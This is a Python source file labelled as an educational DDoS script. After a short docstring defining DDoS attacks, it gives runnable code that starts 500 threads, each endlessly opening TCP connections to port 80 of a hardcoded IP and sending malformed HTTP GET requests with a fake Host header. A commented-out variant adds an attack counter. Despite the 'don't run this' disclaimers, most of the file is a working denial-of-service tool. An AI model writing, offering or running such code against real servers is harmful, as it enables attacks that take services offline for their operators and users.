# DDoS Script - Dont Run this -> Just for educational purposes
'''
 - What it is 
A distributed denial of service (DDoS) attack is a cybercrime that aims to overload 
a networkor website with malicious traffic to make it inaccessible or degrade its performance

 - How it works
Multiple systems flood a target's bandwith or resources with malicious traffic

 - Purpose
 Prevent Legitimate traffic from reaching its intended destination

 - Imapct
 Can compromise online security, sales, reputation, and business
'''

# This script will allow us to flood a server with so many requests 
# after a while, it won't be able to respond anymore and it will go down 

import socket
import threading
# These moduls are often used to create a simple server-client application

target = '10.0.0.138' # Dont DDoS random ip's
fake_ip = '182.21.20.32' # Sample IP
port = 80

def attack():
    # Infinite loop to continuously perform the attack
    while True:
        # Create a new socket using IPv4 and TCP protocols
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the target IP address and port
        s.connect((target, port))
        
        # Send a malformed HTTP GET request to the target
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        
        # Send a fake Host header to the target
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        # Close the socket, ending the connection
        s.close()

# Summary:
# This function implements a basic Denial of Service (DoS) attack by continuously creating 
# connections to a target server and sending malformed HTTP requests. The attack aims to 
# overwhelm the server, potentially causing it to become unresponsive to legitimate users. 
# The use of an infinite loop ensures that the attack continues indefinitely. This code is 
# intended for educational purposes only and should not be used maliciously. Unauthorized 
# use of such techniques can lead to legal consequences.

# How many threads you want to run
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    
'''
# Initialize a global counter to track the number of attacks
attack_num = 0

def attack():
    while True:
        # Create a new socket using IPv4 and TCP protocols
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the target IP address and port
        s.connect((target, port))
        
        # Send a malformed HTTP GET request to the target
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        
        # Send a fake Host header to the target
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        # Increment the global attack counter
        global attack_num
        attack_num += 1
        
        # Print the current number of attacks
        print(attack_num)
        
        # Close the socket, ending the connection
        s.close()

# Summary:
# This function, similar to the first version, implements a Denial of Service (DoS) attack by 
# continuously connecting to a target server and sending malformed HTTP requests. However, 
# this version includes a global counter `attack_num` that tracks and prints the number of 
# attack iterations. This provides feedback on how many times the attack has been executed, 
# which can be used for monitoring or debugging purposes. The same legal and ethical warnings 
# apply as in the first version.

'''
    
